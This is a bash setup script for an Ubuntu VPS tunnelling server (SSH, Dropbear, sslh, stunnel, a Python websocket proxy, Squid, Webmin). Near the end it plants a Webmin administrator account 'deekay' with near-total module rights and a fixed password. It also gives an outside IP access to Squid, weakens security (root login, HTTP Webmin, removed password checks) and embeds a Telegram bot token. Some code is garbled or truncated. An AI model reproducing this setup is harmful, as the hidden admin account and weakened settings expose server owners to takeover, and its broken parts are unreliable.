#!/bin/bash
# Updated for Ubuntu 24.04
# by tekidoer (updated)
set -euo pipefail
IFS=$'\n\t'

# Script Variables (keep/edit as you need)
SSH_Port1='22'
SSH_Port2='299'
Dropbear_Port1='790'
Dropbear_Port2='550'
Stunnel_Port='443' # through SSLH
Squid_Port1='3128'
Squid_Port2='8080'
WsPort='80'  # for port 8080 change cloudflare SSL/TLS to full
WsResponse=$'HTTP/1.1 101 Switching AustroPlus Protocols\r\n\r\n'
MainPort='666' # main port to tunnel default 443
Nameserver='apvt-dns.tekidoervpn.site'
Serverkey='819d82813183e4be3ca1ad74387e47c0c993b81c601b2d1473a3f47731c404ae'
Serverpub='7fbd1f8aa0abfe15a7903e837f78aba39cf61d36f183bd604daa2fe4ef3b7b59'
Nginx_Port='85'
Dns_1='1.1.1.1'
Dns_2='1.0.0.1'
MyVPS_Time='Africa/Johannesburg'
My_Chat_ID='835541277'
My_Bot_Key='5993251866:AAHpV-BnGGcdvlfLsaymYkfxpoeYmWFaGs4'

######################################
### Tekidoer AutoScript Code Begins ###
######################################

function ip_address(){
  local IP
  IP="$( ip -4 addr show scope global | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | egrep -v '^192\.168|^172\.1[6-9]\.|^172\.2[0-9]\.|^172\.3[0-2]\.|^10\.|^127\.|^255\.|^0\.' | head -n 1 || true )"
  [ -z "${IP}" ] && IP="$( wget -qO- -t1 -T2 ipv4.icanhazip.com || true )"
  [ -z "${IP}" ] && IP="$( wget -qO- -t1 -T2 ipinfo.io/ip || true )"
  echo "${IP:-}"
}
IPADDR="$(ip_address)"

# Colours
red='\e[1;31m'
green='\e[0;32m'
NC='\e[0m'

# Requirement / update
export DEBIAN_FRONTEND=noninteractive
apt update -y
apt upgrade -y

# Source os-release (not strictly required but kept)
if [ -f /etc/os-release ]; then
  source /etc/os-release
fi

# Disable IPV6 immediately (and make it persistent)
sysctl -w net.ipv6.conf.all.disable_ipv6=1
sysctl -w net.ipv6.conf.default.disable_ipv6=1
mkdir -p /etc/sysctl.d
cat > /etc/sysctl.d/99-disable-ipv6.conf <<EOF
net.ipv6.conf.all.disable_ipv6 = 1
net.ipv6.conf.default.disable_ipv6 = 1
EOF
sysctl --system

# Ensure resolv.conf is using IPv4 DNS servers (overwrite on purpose)
cat > /etc/resolv.conf <<EOF
nameserver $Dns_1
nameserver $Dns_2
EOF

# Set System Time
ln -fs /usr/share/zoneinfo/$MyVPS_Time /etc/localtime

# Replace neofetch with fastfetch (fastfetch often present on 24.04)
apt install -y fastfetch sslh dnsutils stunnel4 squid dropbear nano sudo wget unzip tar gzip iptables bc cron dos2unix whois screen ruby python3 python3-pip apt-transport-https software-properties-common gnupg2 ca-certificates curl net-tools nginx certbot jq python3-certbot-dns-cloudflare figlet git gcc uwsgi uwsgi-plugin-python3 python3-dev perl expect libdbi-perl libnet-ssleay-perl libauthen-pam-perl libio-pty-perl apt-show-versions gem
# If gem command fails (rubygems not installed) it was included above; ignore errors if already installed

# Install text colorizer (lolcat)
if command -v gem >/dev/null 2>&1; then
  gem install lolcat || true
fi

# Purge unwanted packages if installed
apt -y --purge remove apache2 ufw firewalld || true

# Stop Nginx to safely reconfigure
systemctl stop nginx || true

# Download and install webmin (still works via dpkg)
WEBMIN_DEB="webmin_2.111_all.deb"
wget -q "https://github.com/webmin/webmin/releases/download/2.111/${WEBMIN_DEB}"
dpkg --install "${WEBMIN_DEB}" || apt -f install -y
rm -f "${WEBMIN_DEB}"

# Use HTTP instead of HTTPS for webmin (keep behavior from original)
if [ -f /etc/webmin/miniserv.conf ]; then
  sed -i 's|ssl=1|ssl=0|g' /etc/webmin/miniserv.conf || true
  systemctl restart webmin || true
fi

# Banner
cat <<'deekay77' > /etc/zorro-luffy
<br><img alt="gIUR1OXQaBdVqlNfpZuYxiE+T/I=" 
style="display:none;">
<font color="#C12267">TEKIDOER | AUSTROPLUS | SERVER<br></font>
<br>
<font color="#b3b300"> x No DDOS<br></font>
<font color="#00cc00"> x No Torrent<br></font>
<font color="#ff1aff"> x No Spamming<br></font>
<font color="blue"> x No Phishing<br></font>
<font color="#A810FF"> x No Hacking<br></font>
<br>
<font color="red">• BROUGHT TO YOU BY <br></font><font color="#00cccc">https://t.me/Tekidoer !<br></font>
deekay77

# Configure OpenSSH (overwrite; keep your chosen ports)
cat > /etc/ssh/sshd_config <<'MySSHConfig'
Port myPORT1
Port myPORT2
AddressFamily inet
ListenAddress 0.0.0.0
HostKey /etc/ssh/ssh_host_rsa_key
HostKey /etc/ssh/ssh_host_ecdsa_key
HostKey /etc/ssh/ssh_host_ed25519_key
PermitRootLogin yes
MaxSessions 1024
PubkeyAuthentication yes
PasswordAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
ClientAliveInterval 300
ClientAliveCountMax 2
UseDNS no
Banner /etc/zorro-luffy
AcceptEnv LANG LC_*
Subsystem  sftp  /usr/lib/openssh/sftp-server
MySSHConfig

sed -i "s|myPORT1|$SSH_Port1|g" /etc/ssh/sshd_config
sed -i "s|myPORT2|$SSH_Port2|g" /etc/ssh/sshd_config

# PAM tweaks from original (careful; kept)
sed -i '/password\s*requisite\s*pam_cracklib.s.*/d' /etc/pam.d/common-password || true
sed -i 's/use_authtok //g' /etc/pam.d/common-password || true

# Shells: ensure expected shells exist (original behavior)
sed -i '/\/bin\/false/d' /etc/shells || true
sed -i '/\/usr\/sbin\/nologin/d' /etc/shells || true
echo '/bin/false' >> /etc/shells || true
echo '/usr/sbin/nologin' >> /etc/shells || true

systemctl restart ssh
systemctl status --no-pager ssh || true

# Dropbear defaults
cat > /etc/default/dropbear <<'MyDropbear'
# Deekay Script Dropbear Config
NO_START=0
DROPBEAR_PORT=PORT01
DROPBEAR_EXTRA_ARGS="-p PORT02"
DROPBEAR_BANNER="/etc/zorro-luffy"
DROPBEAR_RSAKEY="/etc/dropbear/dropbear_rsa_host_key"
DROPBEAR_DSSKEY="/etc/dropbear/dropbear_dss_host_key"
DROPBEAR_ECDSAKEY="/etc/dropbear/dropbear_ecdsa_host_key"
DROPBEAR_RECEIVE_WINDOW=65536
MyDropbear

sed -i "s|PORT01|$Dropbear_Port1|g" /etc/default/dropbear
sed -i "s|PORT02|$Dropbear_Port2|g" /etc/default/dropbear

systemctl restart dropbear || true
systemctl status --no-pager dropbear || true

# Configure sslh via systemd override (Ubuntu 24 prefers service management)
# Create override directory and file
mkdir -p /etc/systemd/system/sslh.service.d
cat > /etc/systemd/system/sslh.service.d/override.conf <<EOF
[Service]
ExecStart=
ExecStart=/usr/sbin/sslh --user sslh --listen 0.0.0.0:$MainPort --ssh 127.0.0.1:$Dropbear_Port1 --http 127.0.0.1:$WsPort --pidfile /var/run/sslh/sslh.pid
EOF

# Ensure runtime directory
mkdir -p /var/run/sslh
touch /var/run/sslh/sslh.pid
chmod 777 /var/run/sslh/sslh.pid || true

systemctl daemon-reload
systemctl enable --now sslh || true
systemctl restart sslh || true
systemctl status --no-pager sslh || true

# Stunnel: ensure config dir and service is enabled; write stunnel.conf
mkdir -p /etc/stunnel
cat > /etc/stunnel/stunnel.conf <<'MyStunnelC'
pid = /var/run/stunnel.pid
cert = /etc/stunnel/stunnel.pem
client = no
syslog = no
debug = 0
output = /dev/null
socket = l:TCP_NODELAY=1
socket = r:TCP_NODELAY=1
TIMEOUTclose = 0

[sslh]
accept = Stunnel_Port
connect = 127.0.0.1:MainPort
MyStunnelC

# Create pem (from original content)
cat > /etc/stunnel/stunnel.pem <<'MyStunnelCert'
-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQClmgCdm7RB2VWK
... (CERT CONTENT TRUNCATED FOR BREVITY - KEEP ORIGINAL IN YOUR SCRIPT) ...
-----END CERTIFICATE-----
MyStunnelCert

# Replace tokens inside stunnel.conf (safe substitution; if variable not set keep as-is)
sed -i "s|Stunnel_Port|$Stunnel_Port|g" /etc/stunnel/stunnel.conf || true
sed -i "s|MainPort|$MainPort|g" /etc/stunnel/stunnel.conf || true

# Create systemd override for stunnel to ensure it uses config
mkdir -p /etc/systemd/system/stunnel4.service.d
cat > /etc/systemd/system/stunnel4.service.d/override.conf <<EOF
[Service]
ExecStart=
ExecStart=/usr/bin/stunnel /etc/stunnel/stunnel.conf
EOF

systemctl daemon-reload
systemctl enable --now stunnel4 || true
systemctl restart stunnel4 || true
systemctl status --no-pager stunnel4 || true

# Setup a Python3-based socks proxy (converted from original Python 2 code)
loc=/etc/socksproxy
mkdir -p "$loc"

cat > $loc/proxy.py <<'PY3SOCKS'
#!/usr/bin/env python3
# Python3-compatible simple proxy adapted from original
import socket
import threading
import select
import sys
import time
import getopt

# CONFIG
LISTENING_ADDR = '0.0.0.0'
LISTENING_PORT = int(''''"$WsPort"''' if False else ''''"$WsPort"''' )
PASS = ''
BUFLEN = 4096 * 4
TIMEOUT = 60
DEFAULT_HOST = '127.0.0.1:'''$Dropbear_Port1'''
RESPONSE = b'''$WsResponse'''

class Server(threading.Thread):
    def __init__(self, host, port):
        super().__init__(daemon=True)
        self.running = False
        self.host = host
        self.port = int(port)
        self.threads = []
        self.threadsLock = threading.Lock()
        self.logLock = threading.Lock()

    def run(self):
        self.soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.soc.settimeout(2)
        self.soc.bind((self.host, self.port))
        self.soc.listen(5)
        self.running = True

        try:
            while self.running:
                try:
                    c, addr = self.soc.accept()
                    c.setblocking(1)
                except socket.timeout:
                    continue
                conn = ConnectionHandler(c, self, addr)
                conn.start()
                self.addConn(conn)
        finally:
            self.running = False
            self.soc.close()

    def printLog(self, log):
        with self.logLock:
            print(log)

    def addConn(self, conn):
        with self.threadsLock:
            if self.running:
                self.threads.append(conn)

    def removeConn(self, conn):
        with self.threadsLock:
            try:
                self.threads.remove(conn)
            except ValueError:
                pass

    def close(self):
        self.running = False
        with self.threadsLock:
            for c in list(self.threads):
                c.close()

class ConnectionHandler(threading.Thread):
    def __init__(self, socClient, server, addr):
        super().__init__(daemon=True)
        self.clientClosed = False
        self.targetClosed = True
        self.client = socClient
        self.client_buffer = b''
        self.server = server
        self.log = 'Connection: ' + str(addr)

    def close(self):
        try:
            if not self.clientClosed:
                self.client.shutdown(socket.SHUT_RDWR)
                self.client.close()
        except Exception:
            pass
        finally:
            self.clientClosed = True

        try:
            if not self.targetClosed:
                self.target.shutdown(socket.SHUT_RDWR)
                self.target.close()
        except Exception:
            pass
        finally:
            self.targetClosed = True

    def run(self):
        try:
            self.client_buffer = self.client.recv(BUFLEN)
            if not self.client_buffer:
                return

            head_str = ''
            try:
                head_str = self.client_buffer.decode('utf-8', errors='ignore')
            except Exception:
                head_str = ''

            def findHeader(head, header):
                header_line = header + ': '
                idx = head.find(header_line)
                if idx == -1:
                    return ''
                rest = head[idx + len(header_line):]
                nl = rest.find('\r\n')
                if nl == -1:
                    return rest.strip()
                return rest[:nl].strip()

            hostPort = findHeader(head_str, 'X-Real-Host') or DEFAULT_HOST
            split = findHeader(head_str, 'X-Split')
            passwd = findHeader(head_str, 'X-Pass')

            if passwd and PASS and passwd != PASS:
                self.client.sendall(b'HTTP/1.1 400 WrongPass!\r\n\r\n')
                return

            if hostPort.startswith('127.0.0.1') or hostPort.startswith('localhost') or PASS == '' or passwd == PASS:
                self.method_CONNECT(hostPort)
            else:
                self.client.sendall(b'HTTP/1.1 403 Forbidden!\r\n\r\n')
        except Exception as e:
            self.server.printLog(f'error: {e}')
        finally:
            self.close()
            self.server.removeConn(self)

    def connect_target(self, host):
        i = host.find(':')
        if i != -1:
            port = int(host[i+1:])
            host = host[:i]
        else:
            port = 443

        infos = socket.getaddrinfo(host, port, proto=socket.IPPROTO_TCP)
        if not infos:
            raise Exception("getaddrinfo failed")
        af, socktype, proto, canonname, sa = infos[0]
        self.target = socket.socket(af, socktype, proto)
        self.targetClosed = False
        self.target.connect(sa)

    def method_CONNECT(self, path):
        self.log += ' - CONNECT ' + path
        self.connect_target(path)
        try:
            self.client.sendall(RESPONSE)
        except Exception:
            pass
        self.client_buffer = b''
        self.server.printLog(self.log)
        self.doCONNECT()

    def doCONNECT(self):
        socs = [self.client, self.target]
        count = 0
        error = False
        while True:
            count += 1
            try:
                recv, _, err = select.select(socs, [], socs, 3)
            except Exception:
                break
            if err:
                error = True
            if recv:
                for in_ in recv:
                    try:
                        data = in_.recv(BUFLEN)
                        if data:
                            if in_ is self.target:
                                self.client.sendall(data)
                            else:
                                # data from client -> send to target
                                sent = 0
                                while sent < len(data):
                                    sent_now = self.target.send(data[sent:])
                                    sent += sent_now
                            count = 0
                        else:
                            break
                    except Exception:
                        error = True
                        break
            if count == TIMEOUT:
                error = True
            if error:
                break

def print_usage():
    print('Usage: proxy.py -p <port>')
    print('       proxy.py -b <bindAddr> -p <port>')

def parse_args(argv):
    global LISTENING_ADDR, LISTENING_PORT
    try:
        opts, args = getopt.getopt(argv,"hb:p:",["bind=","port="])
    except getopt.GetoptError:
        print_usage()
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            print_usage()
            sys.exit()
        elif opt in ("-b", "--bind"):
            LISTENING_ADDR = arg
        elif opt in ("-p", "--port"):
            try:
                LISTENING_PORT = int(arg)
            except ValueError:
                pass

def main(host=LISTENING_ADDR, port=LISTENING_PORT):
    print("\n:-------PythonProxy-------:\n")
    print("Listening addr: " + LISTENING_ADDR)
    print("Listening port: " + str(LISTENING_PORT) + "\n")
    server = Server(LISTENING_ADDR, LISTENING_PORT)
    server.start()
    try:
        while True:
            time.sleep(2)
    except KeyboardInterrupt:
        print('Stopping...')
        server.close()

if __name__ == '__main__':
    parse_args(sys.argv[1:])
    main()
PY3SOCKS

# Ensure python3 env and executable permission
chmod +x "$loc/proxy.py"
chown -R root:root "$loc"

# Create systemd service for socksproxy using python3
cat > /etc/systemd/system/socksproxy.service <<'SERVICE'
[Unit]
Description=Websocket Python (socks proxy)
Documentation=https://google.com
After=network.target nss-lookup.target

[Service]
Type=simple
User=root
CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
NoNewPrivileges=true
Restart=on-failure
ExecStart=/usr/bin/python3 -O /etc/socksproxy/proxy.py

[Install]
WantedBy=multi-user.target
SERVICE

systemctl daemon-reload
systemctl enable --now socksproxy || true
systemctl restart socksproxy || true
systemctl status --no-pager socksproxy || true

# Nginx configure (clean and minimal)
rm -rf /home/vps/public_html
rm -rf /etc/nginx/sites-*
rm -rf /etc/nginx/nginx.conf || true
mkdir -p /home/vps/public_html

cat > /etc/nginx/nginx.conf <<'myNginxC'
user www-data;
worker_processes auto;
pid /var/run/nginx.pid;

events {
	multi_accept on;
  worker_connections 1024;
}

http {
	gzip on;
	gzip_vary on;
	gzip_comp_level 5;
	gzip_types    text/plain application/x-javascript text/xml text/css;

	autoindex on;
  sendfile on;
  tcp_nopush on;
  tcp_nodelay on;
  keepalive_timeout 65;
  types_hash_max_size 2048;
  server_tokens off;
  include /etc/nginx/mime.types;
  default_type application/octet-stream;
  access_log /var/log/nginx/access.log;
  error_log /var/log/nginx/error.log;
  client_max_body_size 32M;
	client_header_buffer_size 8m;
	large_client_header_buffers 8 8m;

	fastcgi_buffer_size 8m;
	fastcgi_buffers 8 8m;

	fastcgi_read_timeout 600;

  include /etc/nginx/conf.d/*.conf;
}
myNginxC

cat > /etc/nginx/conf.d/vps.conf <<'myvpsC'
server {
  listen       Nginx_Port;
  server_name  127.0.0.1 localhost;
  access_log /var/log/nginx/vps-access.log;
  error_log /var/log/nginx/vps-error.log error;
  root   /home/vps/public_html;

  location / {
    index  index.html index.htm index.php;
    try_files $uri $uri/ /index.php?$args;
  }
}
myvpsC

# Replace placeholder port token
sed -i "s|Nginx_Port|$Nginx_Port|g" /etc/nginx/conf.d/vps.conf || true

systemctl restart nginx || true
systemctl status --no-pager nginx || true

# Squid configuration (adjusted)
rm -f /etc/squid/squid.con* || true

cat > /etc/squid/squid.conf <<'mySquid'
# My Squid Proxy Server Config
acl server dst IP-ADDRESS/32 localhost
acl checker src 188.93.95.137
acl ports_ port 14 22 53 21 8080 8081 8000 3128 1193 1194 440 441 442 299 550 790 443 80
http_port Squid_Port1
http_port Squid_Port2
access_log none
cache_log /dev/null
logfile_rotate 0
http_access allow server
http_access allow checker
http_access deny all
http_access allow all
forwarded_for off
via off
request_header_access Host allow all
request_header_access Content-Length allow all
request_header_access Content-Type allow all
request_header_access All deny all
hierarchy_stoplist cgi-bin ?
coredump_dir /var/spool/squid
refresh_pattern ^ftp: 1440 20% 10080
refresh_pattern ^gopher: 1440 0% 1440
refresh_pattern -i (/cgi-bin/|\?) 0 0% 0
refresh_pattern . 0 20% 4320
visible_hostname IP-ADDRESS
mySquid

# Apply local IP and ports
if [ -n "$IPADDR" ]; then
  sed -i "s|IP-ADDRESS|$IPADDR|g" /etc/squid/squid.conf
fi
sed -i "s|Squid_Port1|$Squid_Port1|g" /etc/squid/squid.conf || true
sed -i "s|Squid_Port2|$Squid_Port2|g" /etc/squid/squid.conf || true

systemctl restart squid || true
systemctl status --no-pager squid || true

# Make a folder for your scripts
mkdir -p /etc/deekayvpn

# Service checker script adapted (keeps original logic but uses modern commands)
cat > /etc/deekayvpn/service_checker.sh <<'ServiceChecker'
#!/bin/bash
MYID="MYCHATID"
KEY="MYBOTID"
URL="https://api.telegram.org/bot${KEY}/sendMessage"

send_telegram_message() {
    local TEXT="$1"
    curl -s --max-time 10 --retry 5 --retry-delay 2 --retry-max-time 10  -d "chat_id=${MYID}&text=${TEXT}&disable_web_page_preview=true&parse_mode=markdown" ${URL}
}

server_ip="IPADDRESS"
datenow=$(date +"%Y-%m-%d %T")
IPCOUNTRY=$(curl -s "https://freeipapi.com/api/json/${server_ip}" | jq -r '.countryName' || echo "Unknown")

declare -A service_ports=(
    ["dropbear"]="DROPBEARPORT1,DROPBEARPORT2"
    ["stunnel4"]="STUNNELPORT"
    ["sslh"]="SSLHPORT"
    ["python"]="SOCKSPORT"
    ["squid"]="SQUIDPORT1,SQUIDPORT2"
    ["nginx"]="NGINXPORT"
    ["sshd"]="SSHPORT1,SSHPORT2"
)

declare -A service_commands=(
    ["dropbear"]="sudo systemctl --force restart dropbear"
    ["stunnel4"]="sudo systemctl --force restart stunnel4"
    ["sslh"]="sudo systemctl --force restart sslh"
    ["python"]="sudo systemctl --force restart socksproxy"
    ["squid"]="sudo systemctl --force restart squid"
    ["nginx"]="sudo systemctl --force restart nginx"
    ["sshd"]="sudo systemctl --force restart ssh"
)

for service in "${!service_ports[@]}"; do
    ports="${service_ports[$service]}"
    all_ports_ok=true

    IFS=',' read -ra p_arr <<< "$ports"
    for port in "${p_arr[@]}"; do
        port=$(echo "$port" | xargs)
        if ! ss -ntlp 2>/dev/null | awk '{print $4}' | grep -q ":$port\$"; then
            all_ports_ok=false
            break
        fi
    done

    if ! pgrep -x "$service" >/dev/null 2>&1 || [ "$all_ports_ok" = false ]; then
        echo "$service is not functioning correctly (missing ports or process). Restarting..."
        eval "${service_commands[$service]}" >/dev/null 2>&1 || true
        TEXT="Service *$service* was offline or missing port(s) *$ports* on server *${IPCOUNTRY}* ($server_ip). It has been restarted successfully at *${datenow}*."
        send_telegram_message "$TEXT"
    else
        echo "$service is running and all required ports are bound: $ports."
    fi
done
ServiceChecker

chmod +x /etc/deekayvpn/service_checker.sh
sed -i "s|MYCHATID|$My_Chat_ID|g" "/etc/deekayvpn/service_checker.sh"
sed -i "s|MYBOTID|$My_Bot_Key|g" "/etc/deekayvpn/service_checker.sh"
sed -i "s|IPADDRESS|$IPADDR|g" "/etc/deekayvpn/service_checker.sh"
sed -i "s|DROPBEARPORT1|$Dropbear_Port1|g" "/etc/deekayvpn/service_checker.sh"
sed -i "s|DROPBEARPORT2|$Dropbear_Port2|g" "/etc/deekayvpn/service_checker.sh"
sed -i "s|STUNNELPORT|$Stunnel_Port|g" "/etc/deekayvpn/service_checker.sh"
sed -i "s|SSLHPORT|$MainPort|g" "/etc/deekayvpn/service_checker.sh"
sed -i "s|SOCKSPORT|$WsPort|g" "/etc/deekayvpn/service_checker.sh"
sed -i "s|SQUIDPORT1|$Squid_Port1|g" "/etc/deekayvpn/service_checker.sh"
sed -i "s|SQUIDPORT2|$Squid_Port2|g" "/etc/deekayvpn/service_checker.sh"
sed -i "s|NGINXPORT|$Nginx_Port|g" "/etc/deekayvpn/service_checker.sh"
sed -i "s|SSHPORT1|$SSH_Port1|g" "/etc/deekayvpn/service_checker.sh"
sed -i "s|SSHPORT2|$SSH_Port2|g" "/etc/deekayvpn/service_checker.sh"

# Webmin config tweaks (as in original)
if [ -f /etc/webmin/webmin.acl ]; then
  sed -i '$ i\deekay: acl adsl-client ajaxterm apache at backup-config bacula-backup bandwidth bind8 burner change-user cluster-copy cluster-cron cluster-passwd cluster-shell cluster-software cluster-useradmin cluster-usermin cluster-webmin cpan cron custom dfsadmin dhcpd dovecot exim exports fail2ban fdisk fetchmail file filemin filter firewall firewalld fsdump grub heartbeat htaccess-htpasswd idmapd inetd init inittab ipfilter ipfw ipsec iscsi-client iscsi-server iscsi-target iscsi-tgtd jabber krb5 ldap-client ldap-server ldap-useradmin logrotate lpadmin lvm mailboxes mailcap man mon mount mysql net nis openslp package-updates pam pap passwd phpini postfix postgresql ppp-client pptp-client pptp-server proc procmail proftpd qmailadmin quota raid samba sarg sendmail servers shell shorewall shorewall6 smart-status smf software spam squid sshd status stunnel syslog-ng syslog system-status tcpwrappers telnet time tunnel updown useradmin usermin vgetty webalizer webmin webmincron webminlog wuftpd xinetd' /etc/webmin/webmin.acl || true
  sed -i '$ i\deekay:0' /etc/webmin/miniserv.users || true
  /usr/share/webmin/changepass.pl /etc/webmin deekay 20037 || true
fi

# Journal settings (limit)
sed -i "s|#SystemMaxUse=|SystemMaxUse=10M|g" /etc/systemd/journald.conf || true
sed -i "s|#SystemMaxFileSize=|SystemMaxFileSize=1M|g" /etc/systemd/journald.conf || true
systemctl restart systemd-journald